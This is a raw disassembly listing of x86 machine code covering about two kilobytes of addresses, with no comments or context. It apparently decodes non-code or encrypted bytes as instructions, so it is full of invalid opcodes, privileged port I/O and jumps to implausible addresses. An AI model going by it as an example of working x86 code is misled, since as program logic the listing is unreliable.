  40671d:	inc    edi
  40671e:	push   ebp
  40671f:	leave  
  406720:	(bad)  
  406721:	adc    edi,ecx
  406723:	cmp    BYTE PTR ds:0x48dbaba9,dl
  406729:	loopne 0x40674c
  40672b:	jae    0x40670b
  40672d:	sahf   
  40672e:	mov    ebp,0x93c2269d
  406733:	call   0xa76f2eb5
  406738:	popf   
  406739:	pop    esp
  40673a:	das    
  40673b:	add    eax,0x5b272241
  406740:	mov    ebp,0x723a6c45
  406745:	sbb    eax,0x85db281a
  40674a:	js     0x40672d
  40674c:	push   es
  40674d:	in     al,dx
  40674e:	dec    ecx
  40674f:	in     eax,0xe
  406751:	cld    
  406752:	aaa    
  406753:	cs adc bh,0x4e
  406757:	mov    esp,0x8c9bbee0
  40675c:	es cmc 
  40675e:	sbb    ecx,DWORD PTR [eax-0x54]
  406761:	and    al,0xa7
  406763:	xor    al,0x26
  406765:	lods   eax,DWORD PTR ds:[esi]
  406766:	in     al,0xd1
  406768:	or     al,0x8d
  40676a:	(bad)  
  40676b:	lods   eax,DWORD PTR ds:[esi]
  40676c:	nop
  40676d:	fist   WORD PTR [ebx]
  40676f:	sub    esp,DWORD PTR [eax]
  406771:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406773:	outs   dx,DWORD PTR ds:[esi]
  406774:	and    DWORD PTR [edx+0x5abf784a],eax
  40677a:	je     0x40677c
  40677c:	ret    0x5266
  40677f:	mov    ds:0x9b4e4122,eax
  406784:	xchg   ecx,eax
  406785:	(bad)  
  406786:	jecxz  0x406795
  406788:	pop    esp
  406789:	and    DWORD PTR [esi+0x77c806cd],0x15
  406790:	mov    al,ds:0xb9646bdc
  406795:	xrelease xchg BYTE PTR [ebx+0x29f2c89c],ah
  40679c:	push   ebx
  40679d:	cld    
  40679e:	sbb    ebp,DWORD PTR ds:[edx]
  4067a1:	fs loopne 0x4067b9
  4067a4:	jp     0x406810
  4067a6:	push   eax
  4067a7:	out    dx,al
  4067a8:	push   0xc22d26fa
  4067ad:	push   ebx
  4067ae:	jmp    0x36e60b17
  4067b3:	pop    ebp
  4067b4:	cli    
  4067b5:	jo     0x406739
  4067b7:	fwait
  4067b8:	in     eax,0xe2
  4067ba:	mul    DWORD PTR [edx+0x59c0f2cb]
  4067c0:	into   
  4067c1:	ins    BYTE PTR es:[edi],dx
  4067c2:	es jle 0x40674d
  4067c5:	std    
  4067c6:	mov    ds:0xf7b129fc,eax
  4067cb:	xor    eax,0xaf33e900
  4067d0:	xor    edx,DWORD PTR [eax+0x3b]
  4067d3:	out    0x46,eax
  4067d5:	(bad)  
  4067d6:	sub    eax,0x41a17f36
  4067db:	pusha  
  4067dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067dd:	outs   dx,DWORD PTR ds:[esi]
  4067de:	ja     0x4067a2
  4067e0:	(bad)  
  4067e1:	arpl   cx,sp
  4067e3:	repz ficomp WORD PTR [ebp+0x16]
  4067e7:	pop    ss
  4067e8:	in     eax,dx
  4067e9:	mov    al,0x13
  4067eb:	xchg   DWORD PTR [edi-0x69368fe1],esi
  4067f1:	push   es
  4067f2:	mov    esp,0xaca5dfd8
  4067f7:	pop    ebp
  4067f8:	outs   dx,BYTE PTR ds:[esi]
  4067f9:	pop    ds
  4067fa:	call   0x99e6:0xd823dd22
  406801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406802:	push   ecx
  406803:	loopne 0x406841
  406805:	add    ebp,DWORD PTR [eax+0x9d7fbe7]
  40680b:	lock inc edx
  40680d:	mov    cs,WORD PTR [ebx]
  40680f:	fild   DWORD PTR [ecx+0x375af343]
  406815:	faddp  st(6),st
  406817:	fs pop edi
  406819:	sbb    al,0xde
  40681b:	add    BYTE PTR [eax+0x7830dce0],bh
  406821:	jo     0x4067d6
  406823:	or     esp,DWORD PTR [edi]
  406825:	cmp    eax,0x2473ce53
  40682a:	mov    edx,DWORD PTR [ebx+0x21]
  40682d:	xchg   DWORD PTR [ebp+edx*4+0x25],esp
  406831:	stos   BYTE PTR es:[edi],al
  406832:	add    ch,ah
  406834:	jb     0x4067f2
  406836:	xchg   edi,eax
  406837:	das    
  406838:	mov    bh,0x81
  40683a:	xchg   ebp,eax
  40683b:	imul   edi,DWORD PTR [ebx+0x4b],0xffffffef
  40683f:	cmc    
  406840:	push   eax
  406841:	mov    al,ds:0x46ef27f7
  406846:	leave  
  406847:	add    DWORD PTR [ecx+ecx*4+0xc],0x3
  40684c:	mov    edi,0x9e403aeb
  406851:	test   DWORD PTR [edi-0x6a],ecx
  406854:	mov    edx,0x1fa75637
  406859:	mov    eax,ds:0xe837495a
  40685e:	push   esp
  40685f:	ds jle 0x406823
  406862:	push   eax
  406863:	addr16 mov bh,cl
  406866:	test   BYTE PTR [eax-0x3f],dh
  406869:	push   edx
  40686a:	sbb    edi,DWORD PTR [esp+edx*8]
  40686d:	mov    edi,DWORD PTR [eax]
  40686f:	in     al,dx
  406870:	call   0x5609:0xfe4ba40a
  406877:	mov    esi,0x949ccc65
  40687c:	(bad)  
  40687f:	jbe    0x406852
  406881:	mov    ecx,0x562969b4
  406886:	xchg   edx,eax
  406887:	jecxz  0x4068b6
  406889:	std    
  40688a:	adc    eax,0xbd864a4e
  40688f:	(bad)  [edx+0x3]
  406892:	pop    ecx
  406893:	jp     0x40682d
  406895:	cli    
  406896:	jne    0x406822
  406898:	outs   dx,BYTE PTR ds:[esi]
  406899:	or     al,0xae
  40689b:	js     0x40688a
  40689d:	cmp    ebx,edx
  40689f:	xchg   BYTE PTR [esi],bh
  4068a1:	jmp    0x42f35c28
  4068a6:	xor    BYTE PTR [ebx+ebx*8],al
  4068a9:	lock mov eax,ss:0x6e934a
  4068b0:	sbb    bh,ah
  4068b2:	push   edi
  4068b4:	scas   eax,DWORD PTR es:[edi]
  4068b5:	lods   eax,DWORD PTR ds:[esi]
  4068b6:	push   ecx
  4068b7:	push   es
  4068b8:	inc    ebp
  4068b9:	cmp    ah,BYTE PTR [edx-0x2281ce59]
  4068bf:	iret   
  4068c0:	add    edx,edx
  4068c2:	(bad)  
  4068c3:	mul    BYTE PTR [ecx]
  4068c5:	sub    BYTE PTR [esi],0x91
  4068c8:	ins    DWORD PTR es:[edi],dx
  4068c9:	mov    ds:0x6fd7cd29,al
  4068ce:	or     ah,ch
  4068d0:	xor    dh,BYTE PTR [ebx+0x1a]
  4068d3:	loop   0x4068f0
  4068d5:	js     0x406951
  4068d7:	or     DWORD PTR [ecx-0x2aa97ec5],0x28
  4068de:	pop    ss
  4068df:	mov    ds:0x8cfa3dfd,eax
  4068e4:	sub    DWORD PTR gs:[esi],0xffffff99
  4068e8:	mov    al,ds:0x24457b25
  4068ed:	jp     0x4068f3
  4068ef:	ins    DWORD PTR es:[edi],dx
  4068f0:	xchg   esi,eax
  4068f1:	test   eax,0x4751686
  4068f6:	outs   dx,BYTE PTR ds:[esi]
  4068f7:	cmp    DWORD PTR [edx-0x2769211c],eax
  4068fd:	dec    DWORD PTR [ecx+eiz*8-0x5d6a6383]
  406904:	inc    ecx
  406905:	jecxz  0x4068e7
  406907:	push   ecx
  406908:	dec    ebp
  406909:	or     eax,0xb2168888
  40690e:	mov    ecx,0xb52f6744
  406913:	cmp    BYTE PTR [edx-0x7],cl
  406916:	fcmove st,st(7)
  406918:	jae    0x4068fa
  40691a:	mov    BYTE PTR [ebp+0x11d8ba09],ah
  406920:	ret    
  406921:	aad    0x1e
  406923:	add    ah,BYTE PTR [edi-0x64791252]
  406929:	dec    ebx
  40692a:	rep ins BYTE PTR es:[edi],dx
  40692c:	jbe    0x406960
  40692e:	hlt    
  40692f:	xor    DWORD PTR [ebp-0x6d],0x1579b17a
  406936:	shl    BYTE PTR [eax+ebp*4-0x7c],cl
  40693a:	and    DWORD PTR [ecx-0x10503131],ebx
  406940:	cld    
  406941:	sub    ebx,DWORD PTR ds:0x9a40e85a
  406947:	aas    
  406948:	jnp    0x406991
  40694a:	mov    esp,DWORD PTR [ebx]
  40694c:	xchg   BYTE PTR [eax],bh
  40694e:	adc    esi,DWORD PTR ds:0x31a8973
  406954:	cmpxchg dl,al
  406957:	add    dh,BYTE PTR [eax+edi*1]
  40695a:	add    eax,0x9f57476e
  40695f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406960:	pop    ebx
  406961:	test   BYTE PTR [esi-0x3f02fdd9],bh
  406967:	sbb    BYTE PTR [edx-0x1de77c58],bh
  40696d:	xor    eax,0x7af49ddb
  406972:	add    eax,0x210f8f80
  406977:	loope  0x4069ee
  406979:	push   edi
  40697a:	lods   al,BYTE PTR ds:[esi]
  40697b:	iret   
  40697c:	dec    ebx
  40697d:	xchg   ebx,eax
  40697e:	cwde   
  40697f:	jno    0x4069ff
  406981:	jle    0x40696f
  406983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406984:	dec    esi
  406985:	lods   eax,DWORD PTR ds:[esi]
  406986:	or     al,0x1e
  406988:	je     0x4069f2
  40698a:	shl    BYTE PTR [edi+0x1d],1
  40698d:	pop    ds
  40698e:	in     eax,dx
  40698f:	xchg   esp,eax
  406990:	call   0x6022164c
  406995:	and    BYTE PTR [eax+ebp*4-0x12b59c2b],al
  40699c:	aad    0x2f
  40699e:	(bad)  
  40699f:	push   esp
  4069a0:	xchg   ch,ch
  4069a2:	add    eax,ebx
  4069a4:	dec    ebx
  4069a5:	push   esi
  4069a6:	adc    bl,ch
  4069a8:	xlat   BYTE PTR ds:[ebx]
  4069a9:	pop    ds
  4069aa:	xchg   DWORD PTR [edx],eax
  4069ac:	xchg   ebx,eax
  4069ad:	ja     0x40696f
  4069af:	pop    es
  4069b0:	and    ah,BYTE PTR [edi]
  4069b2:	pop    es
  4069b3:	sbb    bl,BYTE PTR [ebx-0x64ff36aa]
  4069b9:	mov    bl,0x1d
  4069bb:	pop    ds
  4069bc:	mov    DWORD PTR fs:[eax-0x361a5553],0x76f4721d
  4069c7:	jno    0x406a19
  4069c9:	mov    edi,0x812e7fbb
  4069ce:	pop    ebx
  4069cf:	jmp    0x47df7f99
  4069d4:	cmp    DWORD PTR [ecx+0x7d],0x2d8ede21
  4069db:	inc    edi
  4069dc:	or     al,0xa3
  4069de:	call   DWORD PTR [ecx-0xb]
  4069e1:	xor    ebp,DWORD PTR [ecx-0x1124e844]
  4069e7:	out    dx,al
  4069e8:	xchg   esp,eax
  4069e9:	jns    0x406a61
  4069eb:	mov    dh,0xaa
  4069ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ee:	push   ebp
  4069ef:	add    BYTE PTR [edx+eiz*2],ch
  4069f2:	jmp    0x5487a76a
  4069f7:	xchg   edx,eax
  4069f8:	sbb    ecx,ebx
  4069fa:	cld    
  4069fb:	fdiv   st,st(3)
  4069fd:	scas   eax,DWORD PTR es:[edi]
  4069fe:	(bad)  
  4069ff:	pop    ds
  406a00:	xchg   DWORD PTR [ecx-0x1aa08940],esi
  406a06:	lds    edi,FWORD PTR [edi-0x3936a909]
  406a0c:	cdq    
  406a0d:	and    edx,esi
  406a0f:	lahf   
  406a10:	cmp    ch,cl
  406a12:	mov    ds:0x5454cd83,eax
  406a17:	sub    al,al
  406a19:	add    DWORD PTR [edi+esi*2+0x2f],0x70
  406a1e:	ficomp DWORD PTR [ebx]
  406a20:	xchg   ebx,eax
  406a21:	push   0xfffffffa
  406a23:	repz cmp esp,DWORD PTR [edx]
  406a26:	push   eax
  406a27:	sub    bl,bl
  406a29:	js     0x58ecc3f7
  406a2f:	xchg   edi,eax
  406a30:	push   esp
  406a31:	xchg   ecx,eax
  406a32:	jnp    0x406a40
  406a34:	or     dh,0xc1
  406a37:	bound  ebx,QWORD PTR [ebx]
  406a39:	stc    
  406a3a:	add    eax,0x881a39e2
  406a3f:	and    eax,0x695fb395
  406a44:	sbb    esi,edi
  406a46:	lahf   
  406a47:	inc    ebx
  406a48:	ss test eax,0xc1c5226b
  406a4e:	mov    edi,0x23d90192
  406a53:	jge    0x406a58
  406a55:	imul   ebp,DWORD PTR [esi+0x75881311],0xffffff85
  406a5c:	bound  ebp,QWORD PTR [esi-0x4059bf53]
  406a62:	pusha  
  406a63:	aad    0x38
  406a65:	xlat   BYTE PTR ds:[ebx]
  406a66:	rcl    edi,1
  406a68:	popf   
  406a69:	aas    
  406a6a:	in     al,dx
  406a6b:	ret    
  406a6c:	cs ret 
  406a6e:	nop
  406a6f:	mov    dh,0x6f
  406a71:	cld    
  406a72:	repnz stos DWORD PTR es:[edi],eax
  406a74:	call   0x477:0xb3c93513
  406a7b:	loopne 0x406ada
  406a7d:	push   es
  406a7e:	push   0xffffffd8
  406a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a81:	lds    ebp,FWORD PTR [ebp+0x3fe2c91d]
  406a87:	stos   DWORD PTR es:[edi],eax
  406a88:	rcr    DWORD PTR [ebx+eiz*8],cl
  406a8b:	(bad)  
  406a8c:	cs mov cl,0x66
  406a8f:	adc    BYTE PTR [edx+0x68],0x7
  406a93:	sbb    ch,ch
  406a95:	fwait
  406a96:	cdq    
  406a97:	std    
  406a98:	call   0xbae445af
  406a9d:	push   eax
  406a9e:	fisub  DWORD PTR [ebx-0x47]
  406aa1:	jl     0x406ac4
  406aa3:	xor    al,dh
  406aa5:	dec    esp
  406aa6:	idiv   DWORD PTR [esi-0x3e03731c]
  406aac:	stos   BYTE PTR es:[edi],al
  406aad:	cdq    
  406aae:	dec    edi
  406aaf:	leave  
  406ab0:	adc    dh,BYTE PTR [ebp-0x52db7f87]
  406ab6:	dec    esi
  406ab7:	dec    edi
  406ab8:	repnz mov eax,ds:0xee226ead
  406abe:	sub    ch,0x3a
  406ac1:	fldenv [esi+eax*1]
  406ac4:	shl    BYTE PTR ss:[ebp-0x58eda0f7],0x69
  406acc:	dec    ebx
  406acd:	call   0x5636:0xd2110378
  406ad4:	lea    ecx,[esi-0x52208475]
  406ada:	cmp    BYTE PTR [edx+0x1e],0x2e
  406ade:	pop    ds
  406adf:	fsubr  DWORD PTR [ebx]
  406ae1:	push   edx
  406ae2:	add    DWORD PTR [ebx+0x651549c9],ebx
  406ae8:	or     al,0x6
  406aea:	adc    bl,dl
  406aec:	mov    esi,0x566fc0ad
  406af1:	fst    DWORD PTR [esi-0x57c7c55c]
  406af7:	inc    ebx
  406af8:	cmp    al,0xcb
  406afa:	sbb    BYTE PTR [ecx+0x12],bh
  406afd:	mov    al,0xe6
  406aff:	into   
  406b00:	loope  0x406b23
  406b02:	jecxz  0x406b64
  406b04:	xchg   esi,eax
  406b05:	xor    eax,0x1ac41feb
  406b0a:	sub    DWORD PTR [ebx+edi*8-0x4c],esp
  406b0e:	pop    edx
  406b0f:	pop    ebp
  406b10:	cdq    
  406b11:	retf   0x2443
  406b14:	adc    BYTE PTR [eax-0x3e7ed163],ch
  406b1a:	sub    dh,bh
  406b1c:	into   
  406b1d:	ds push 0x3b33c04b
  406b23:	lds    ecx,FWORD PTR [eax-0x6fa22f88]
  406b29:	mov    ah,BYTE PTR [ebx-0x4edf0a1e]
  406b2f:	mov    ds:0x66523b,eax
  406b34:	call   0x6a4b:0x1392f797
  406b3b:	jmp    0x406ad3
  406b3d:	pop    ds
  406b3e:	push   ss
  406b3f:	xchg   ecx,eax
  406b40:	add    esi,DWORD PTR [ebx]
  406b42:	pop    esp
  406b43:	minps  xmm5,XMMWORD PTR [esi-0x46]
  406b47:	jb     0x406af3
  406b49:	adc    ebx,DWORD PTR [ebx-0x447edfe6]
  406b4f:	sbb    DWORD PTR [eax+0x6ee2a78d],0x4b08f18d
  406b59:	mov    dl,ch
  406b5b:	or     DWORD PTR [eax-0x44],0x5
  406b5f:	add    BYTE PTR [eax-0x1531f73b],cl
  406b65:	fwait
  406b66:	retf   0x658b
  406b69:	arpl   WORD PTR ds:0xfd2d741a,sp
  406b6f:	pop    ebp
  406b70:	xchg   esi,eax
  406b71:	sub    DWORD PTR [ebx+edx*4+0x2a],0x6f
  406b76:	int    0x48
  406b78:	and    di,dx
  406b7b:	sbb    BYTE PTR [esi+0x58],bh
  406b7e:	(bad)  [ebx-0x7225ac5a]
  406b84:	pop    edi
  406b85:	push   es
  406b86:	cmp    esp,DWORD PTR [ecx+0x33]
  406b89:	pop    ecx
  406b8a:	mov    dl,0xaf
  406b8c:	(bad)  
  406b8d:	jbe    0x406baf
  406b8f:	adc    eax,0xf93ad2dc
  406b94:	mov    esp,0x27957cdf
  406b99:	maskmovq mm1,mm0
  406b9c:	pop    ebx
  406b9e:	aas    
  406b9f:	mov    dh,0x1f
  406ba1:	dec    edi
  406ba2:	cwde   
  406ba3:	jmp    0x406b86
  406ba5:	mov    ah,0xe7
  406ba7:	js     0x406b92
  406ba9:	mov    ah,0x23
  406bab:	jbe    0x406c23
  406bad:	(bad)  
  406bae:	outs   dx,DWORD PTR ds:[esi]
  406baf:	dec    esi
  406bb0:	push   0xffffff87
  406bb2:	bound  eax,QWORD PTR [ebx]
  406bb4:	fisttp QWORD PTR [ebx+0x8]
  406bb7:	jmp    0xbe3afc18
  406bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bbd:	stos   DWORD PTR es:[edi],eax
  406bbe:	in     eax,dx
  406bbf:	ds xchg ecx,eax
  406bc1:	retf   
  406bc2:	and    BYTE PTR [esi],bh
  406bc4:	rcr    DWORD PTR [esi],0x4
  406bc7:	jecxz  0x406b5f
  406bc9:	enter  0x738f,0x10
  406bcd:	or     eax,0x235c024
  406bd2:	and    al,dh
  406bd4:	stc    
  406bd5:	xor    ch,bl
  406bd7:	cmc    
  406bd8:	xchg   dl,dh
  406bda:	push   ebp
  406bdb:	jl     0x406b64
  406bdd:	sar    BYTE PTR [edx],0xff
  406be0:	add    al,0x18
  406be2:	es je  0x406bd8
  406be5:	xchg   esi,eax
  406be6:	(bad)  ds:0xd4f2fdc2
  406bec:	in     al,dx
  406bed:	hlt    
  406bee:	and    al,0xb1
  406bf0:	imul   edx,DWORD PTR [esi],0x16843efd
  406bf6:	lods   eax,DWORD PTR ds:[esi]
  406bf7:	loopne 0x406c65
  406bf9:	sbb    edx,DWORD PTR [ebp+0x42]
  406bfc:	sub    DWORD PTR [eax*1-0x52c406af],esi
  406c03:	push   esp
  406c04:	mov    al,0x84
  406c06:	int3   
  406c07:	ja     0x406c67
  406c09:	js     0x406c71
  406c0b:	repnz sub DWORD PTR [edx-0x38cbb29],0x5
  406c13:	mov    DWORD PTR [edi+0x32],0x688315c7
  406c1a:	add    BYTE PTR [eax+eax*4-0x38],dh
  406c1e:	inc    eax
  406c1f:	cmp    eax,0xa3b7eaa9
  406c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c25:	test   DWORD PTR [edx],eax
  406c27:	dec    cx
  406c29:	cmp    al,0x74
  406c2b:	loop   0x406bcf
  406c2d:	mov    eax,ds:0xade9c2ff
  406c32:	lock adc eax,0xa6f889e0
  406c38:	dec    esi
  406c39:	loop   0x406ca4
  406c3b:	sti    
  406c3c:	dec    ecx
  406c3d:	and    edx,DWORD PTR [edx]
  406c3f:	add    al,0xcf
  406c41:	das    
  406c42:	xor    DWORD PTR [ecx-0x2b],eax
  406c45:	(bad)
  406c49:	sub    dl,BYTE PTR [ecx+esi*1+0x7d]
  406c4d:	imul   ecx,DWORD PTR [ecx+0x1d],0x33
  406c51:	add    dh,BYTE PTR [ecx+0x48]
  406c54:	push   edx
  406c55:	mov    ebp,0xadbff954
  406c5a:	jmp    0x109b0661
  406c5f:	out    0x71,eax
  406c61:	and    ebp,edx
  406c63:	inc    DWORD PTR [eax+0x5b7068d9]
  406c69:	mov    ecx,0x6e05fdb2
  406c6e:	daa    
  406c6f:	xor    al,0xd
  406c71:	bound  eax,QWORD PTR [eax]
  406c73:	or     bh,BYTE PTR [ebx]
  406c75:	mov    eax,0xfe175bfb
  406c7a:	jns    0x406cec
  406c7c:	fcomp  DWORD PTR [edi-0x5323d6fc]
  406c82:	fcomp  QWORD PTR [ecx-0x3ecf2c61]
  406c88:	arpl   si,ax
  406c8a:	pop    ebx
  406c8b:	ror    ebx,1
  406c8d:	and    eax,0xebce91c0
  406c92:	mov    ebx,0x8ea8a944
  406c97:	sbb    dl,ah
  406c99:	mov    esp,0x14a5780c
  406c9e:	loope  0x406d05
  406ca0:	add    eax,0xe7db7178
  406ca5:	ds inc ebp
  406ca7:	adc    al,0xb1
  406ca9:	add    BYTE PTR [ebp-0x553cca69],0xf8
  406cb0:	fiadd  DWORD PTR [ecx+0x2d978d43]
  406cb6:	dec    ebx
  406cb7:	xlat   BYTE PTR ds:[ebx]
  406cb8:	leave  
  406cb9:	push   edx
  406cba:	jno    0x406c53
  406cbc:	or     al,0x2a
  406cbe:	sbb    BYTE PTR [eax+0x60],bl
  406cc1:	(bad)  
  406cc2:	dec    edx
  406cc3:	ins    BYTE PTR es:[edi],dx
  406cc4:	(bad)  
  406cc5:	lahf   
  406cc6:	jl     0x406d2d
  406cc8:	sub    al,0x63
  406cca:	frstor [esi-0x46]
  406ccd:	in     eax,dx
  406cce:	inc    esp
  406ccf:	xor    DWORD PTR [edx-0x67b033e0],esp
  406cd5:	push   esp
  406cd6:	ror    DWORD PTR [eax-0xaebf04a],cl
  406cdc:	pop    ecx
  406cdd:	pop    ebp
  406cde:	push   es
  406cdf:	sbb    DWORD PTR [esi],ebx
  406ce1:	cld    
  406ce2:	mov    esi,0x1e1c4a59
  406ce7:	and    ebp,ebx
  406ce9:	cs pop esp
  406ceb:	(bad)  
  406cec:	cdq    
  406ced:	sub    dh,BYTE PTR [eax+0x45]
  406cf0:	dec    eax
  406cf1:	jmp    0xa64c:0x9ed971f3
  406cf8:	mov    ebp,0xd6ad41fe
  406cfd:	int    0x19
  406cff:	jmp    0x406d2e
  406d01:	shl    BYTE PTR [esi],1
  406d03:	jnp    0x406c9f
  406d05:	sub    eax,0xfab68fcd
  406d0a:	cwde   
  406d0b:	adc    DWORD PTR [esi+0x7c],ecx
  406d0e:	leave  
  406d0f:	(bad)  
  406d10:	(bad)  
  406d11:	lock add bh,bl
  406d14:	or     DWORD PTR [edx-0xe],0x45
  406d18:	popa   
  406d19:	repz mov ecx,0xc9f407c8
  406d1f:	xchg   ebp,eax
  406d20:	ror    edx,cl
  406d22:	ja     0x406d43
  406d24:	adc    bl,bl
  406d26:	push   eax
  406d27:	fwait
  406d28:	push   eax
  406d29:	xor    eax,0x43a93c4d
  406d2e:	fs sar bl,cl
  406d31:	cmp    eax,0xb8f9714f
  406d36:	std    
  406d37:	jno    0x406d01
  406d39:	xchg   edx,eax
  406d3a:	imul   ebp,DWORD PTR [eax+edi*4-0x38],0x8e5bed91
  406d42:	js     0x406ce7
  406d44:	test   BYTE PTR [ebx-0x579fd17c],bl
  406d4a:	sbb    al,0x38
  406d4c:	int3   
  406d4d:	fimul  WORD PTR [edx-0x17849075]
  406d53:	test   al,0xda
  406d55:	dec    edx
  406d56:	xor    eax,edx
  406d58:	sbb    bh,BYTE PTR [ebx-0x77]
  406d5b:	jmp    0x64e6:0xe40c620
  406d62:	mov    ds:0xd9b4cec6,al
  406d67:	or     edx,DWORD PTR [ecx+0x4]
  406d6a:	push   esi
  406d6b:	xchg   ebx,eax
  406d6c:	repnz mov al,ds:0x23278a00
  406d72:	jno    0x406d35
  406d74:	xor    DWORD PTR [edx+0xe6d5c45],eax
  406d7a:	aaa    
  406d7b:	addr16 call 0x2b70:0x14943976
  406d83:	pop    ecx
  406d84:	pop    ss
  406d85:	fcomp  QWORD PTR [edi+ebx*2+0x5604c4b9]
  406d8c:	cwde   
  406d8d:	shl    BYTE PTR [eax],0x16
  406d90:	je     0x406dbb
  406d92:	shl    dh,0x2f
  406d95:	xchg   ebp,eax
  406d96:	push   eax
  406d97:	push   eax
  406d98:	and    al,0x1c
  406d9a:	mov    esp,0xb43d670
  406d9f:	bound  ebx,QWORD PTR [edx]
  406da1:	mov    esi,DWORD PTR [eax-0x66291e4]
  406da7:	(bad)  
  406da8:	cmp    al,0xf0
  406daa:	(bad)  
  406dab:	pop    esp
  406dac:	push   esp
  406dad:	push   cs
  406dae:	or     cl,BYTE PTR [esp+edx*4]
  406db1:	fsubr  DWORD PTR ds:0xaa648c99
  406db7:	mov    ds:0x871b08d2,eax
  406dbc:	sbb    BYTE PTR [eax-0x2501175],0xdc
  406dc3:	inc    eax
  406dc4:	sbb    ah,al
  406dc6:	mov    eax,ds:0xe247a0e
  406dcb:	or     ebp,DWORD PTR [edx+0x71]
  406dce:	ret    0x2752
  406dd1:	arpl   WORD PTR [edi+edi*4],ax
  406dd4:	ss xchg ecx,eax
  406dd6:	fistp  QWORD PTR [bx+di+0x32]
  406dda:	mov    edx,DWORD PTR [ecx+0x37c64e9b]
  406de0:	stc    
  406de1:	adc    al,0xb0
  406de3:	mov    ds:0x9ca937e0,eax
  406de8:	jo     0x406d74
  406dea:	stos   DWORD PTR es:[edi],eax
  406deb:	cmp    edi,DWORD PTR [edx+0x7bcc9775]
  406df1:	scas   al,BYTE PTR es:[edi]
  406df2:	pop    ebp
  406df3:	sbb    esi,DWORD PTR [ebp+0x49]
  406df6:	push   0x14
  406df8:	enter  0x4143,0x7b
  406dfc:	and    eax,0x578a27ee
  406e01:	repnz fisttp WORD PTR [edi+ebx*1-0x30b9ae83]
  406e09:	call   0xb1c10348
  406e0e:	xchg   BYTE PTR [edi-0x6fe2d26e],cl
  406e14:	and    al,0xb2
  406e16:	mov    ch,0x4b
  406e18:	jmp    0x3c20:0xc1cc8929
  406e1f:	retf   
  406e20:	xchg   ebx,eax
  406e21:	dec    ebx
  406e22:	inc    ecx
  406e23:	rcl    esp,cl
  406e25:	sub    dh,0xd6
  406e28:	add    al,0xbc
  406e2a:	out    0x71,eax
  406e2c:	cdq    
  406e2d:	pop    edi
  406e2e:	xchg   ebp,eax
  406e2f:	int    0x46
  406e31:	xor    al,0xf3
  406e33:	hlt    
  406e34:	inc    edx
  406e35:	cmp    al,0x96
  406e37:	pop    ebx
  406e38:	jne    0x406e47
  406e3a:	and    bh,ah
  406e3c:	mov    dh,0x91
  406e3e:	dec    ebx
  406e3f:	loopne 0x406eb2
  406e41:	les    ebp,FWORD PTR [edx+0x1816d46e]
  406e47:	shr    dl,cl
  406e49:	or     al,0x85
  406e4b:	sbb    eax,0x2739d3
  406e50:	les    ecx,FWORD PTR [edi]
  406e52:	addr16 ja 0x406e56
  406e55:	mov    eax,0xb2c9c062
  406e5a:	fld    TBYTE PTR [ecx-0xa264e17]
  406e60:	rol    dl,0x2b
  406e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e64:	les    edx,FWORD PTR [ebp-0x56dfaa22]
  406e6a:	nop
  406e6b:	mov    WORD PTR ds:0xb44af452,?
  406e71:	mov    ch,0x74
  406e73:	jno    0x406e23
  406e75:	dec    cl
  406e77:	les    edi,FWORD PTR [edx+0x4]
  406e7a:	mov    ebx,0xb5150fe4
  406e7f:	clc    
  406e80:	aad    0xb1
  406e82:	pop    edx
  406e83:	mov    bl,0xaa
  406e85:	xchg   ebp,eax
  406e86:	mov    ebp,0x22fc9a6a
  406e8b:	icebp  
  406e8c:	pop    ss
  406e8d:	(bad)  
  406e8e:	xlat   BYTE PTR ds:[ebx]
  406e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e90:	pop    ebx
  406e91:	adc    DWORD PTR [eax+0x27],0x43f6b68f
  406e98:	lds    esp,FWORD PTR [esp+ebx*2-0xf26989f]
  406e9f:	call   0x3451bb99
  406ea4:	lods   al,BYTE PTR ds:[esi]
  406ea5:	or     edi,DWORD PTR [eax-0x21]
  406ea8:	ja     0x406f0f
  406eaa:	add    ah,bh
  406eac:	call   0x891b9bd2
  406eb1:	xchg   edi,eax
  406eb2:	xchg   ecx,eax
  406eb3:	mov    ebx,0x4716164a
  406eb8:	jne    0x406f39
  406eba:	inc    esp
  406ebb:	xchg   ecx,eax
  406ebc:	mov    al,0xfd
  406ebe:	retf   0xfdf3
  406ec1:	fs dec esi
  406ec3:	mov    edi,0x220b6da2
  406ec8:	adc    eax,0x44ca71e9
  406ecd:	push   ds
  406ece:	sub    DWORD PTR [ebp-0x4b39a16],esi
  406ed4:	icebp  
  406ed5:	clc    
  406ed6:	daa    
  406ed7:	xchg   ecx,eax
  406ed8:	pop    esi
  406ed9:	inc    eax
  406eda:	xchg   ecx,eax
  406edb:	jge    0x406ed4
  406edd:	out    dx,al
  406ede:	aad    0x3d
  406ee0:	(bad)  
  406ee1:	call   0x27f3:0x61bb4d9a
  406ee8:	xlat   BYTE PTR ds:[ebx]
  406ee9:	push   eax
  406eea:	ror    DWORD PTR [eax],0xc7
  406eed:	mov    esi,DWORD PTR [edi]
  406eef:	pushf  
  406ef0:	pushf  
  406ef1:	sub    BYTE PTR [edx],dh
  406ef3:	outs   dx,DWORD PTR ds:[esi]
  406ef4:	mov    ebp,ebx
  406ef6:	pusha  
  406ef7:	sbb    ecx,edi
  406ef9:	and    al,0x81
  406efb:	adc    BYTE PTR [esi],dl
  406efd:	imul   esp,DWORD PTR [esi],0xcb5b4984
  406f03:	(bad)  
  406f04:	scas   al,BYTE PTR es:[edi]
  406f05:	xchg   esp,eax
  406f06:	inc    ecx
  406f07:	mov    ds:0xa858b13c,al
  406f0c:	mov    ds:0x12997622,al
  406f11:	push   cs
  406f12:	enter  0x76e7,0xeb
  406f16:	adc    BYTE PTR [edx-0x6c6c028],bh
  406f1c:	inc    esp
  406f1d:	dec    edx
  406f1e:	aaa    
  406f1f:	test   eax,0x47e8f986
  406f24:	cmp    DWORD PTR [eax+0x488abbbf],eax
  406f2a:	jl     0x406efb
  406f2c:	pop    ecx
  406f2d:	popf   
